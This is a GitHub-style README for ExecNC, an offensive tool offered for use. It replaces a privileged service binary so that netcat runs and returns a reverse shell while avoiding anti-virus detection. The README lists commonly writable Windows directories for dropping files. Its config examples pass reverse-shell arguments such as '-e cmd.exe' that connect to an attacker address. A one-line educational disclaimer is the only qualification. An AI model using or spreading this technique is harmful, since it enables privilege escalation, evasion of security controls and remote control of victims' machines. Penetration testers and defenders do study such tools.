ExecNC
=======
![](https://img.shields.io/badge/build-passing-brightgreen) ![](https://img.shields.io/badge/license-GPL%203-blue) ![](https://img.shields.io/badge/execnc-v1.0-blue)


ExecNC is a tool that simply executes a file (usually netcat) with certain parameters.

It serves quite a niche use. When looking to escalate privilege through a reverse shell by replacing a binary
(e.g. A service binary that is regularly executed by a privileged user), one usually opts for MSFVenom. ExecNC was made for when
such a reverse-shell payload is being blocked by an anti-virus and attempts to FUD it aren't working.

Because Netcat (nc.exe) isn't considered a virus, you would want to replace the binary with that instead, however it requires arguments
that you may not be able to configure.

ExecNC is a binary that can replace the vulnerable binary.
It simply executes Netcat with arguments that are specified in a file.
This way, reverse-shell is obtained the same way but with natural anti-virus evasion.


# Features
- Logs to file for help in debugging
  - Includes timestamps so you know when it is executing
  - Also logs the executed file's output
- Natural Anti-virus evasion to get reverse-shell
- Versatile behaviour to bypass common restrictions


# How It Works
ExecNC revolves around the following commonly-writable directories ("CWD"):
```
./ (Current directory)
C:/users/public
C:/users/{UserName}
C:/windows/system32/spool/drivers/color
C:/windows/temp
```
The program will use the first CWD it finds in this order.


## Making the Config File
The config file defines how ExecNC will run. When looking for the config file, ExecNC will look for the first occurrence
of `execnc.json` in the CWDs listed above.

The format is as follows:  
*Note: Backslashes must be escaped.*  
*Note: All properties are optional.*  
*Note: All values must be strings.*
```json
{
  "exec": "C:\\whatever\\nc.exe",
  "args": "localhost 6969 -e cmd.exe -w 3 -v",
  "timeout": "10000",
  "log": "C:\\whatever\\execnc.log",
  "testrun": "false",
  "runmany": "false"
}
```

**exec**: Path to the executable to execute. If omitted, it will look for `nc.exe`
in the CWDs.

**args**: Arguments for the executable as a space-delimited string.

**timeout**: How many milliseconds to wait for before terminating the executable.
If `-1` or omitted, will never timeout.

**log**: Where to log to. Log file will include timestamps and the executed file's output
that are appended instead of overwritten. If it fails to log to your specified
location, it will log to the CWD instead.
Omitt or set to `"false"` to not log to file.

**testrun**: if `"true"`, will do everything but run the executable. Useful for testing.
If omitted, will execute as normal.

**runmany**: If omitted or `"false"`, will not run the executable if it's already running
(i.e. a process with that name already exists).


# Requirements
- Tested on Windows 11


# Basic Example
**Replace `vulnservice.exe` from `execnc.exe`, put `nc.exe` and `execnc.json` in the same folder:**
```
C:\
 └ Program Files
  └ Vulnerable Service
   └ vulnservice.exe.bak
   └ vulnservice.exe
   └ nc.exe
   └ execnc.json
   └ ... 
```

**execnc.json contents:**
```json
{
  "args": "192.168.69.69 135 -e cmd.exe"
}
```

**Running will cause `nc.exe` to be executed with the aforementioned args with no logging.**

*If you are unable to add `nc.exe` and `execnc.json` to the directory, simple add it
to one of the CWDs and ExecNC will find it.*


# Disclaimer
This tool is for educational purposes only.

# Contact
You can email me at kaimo.sec@protonmail.com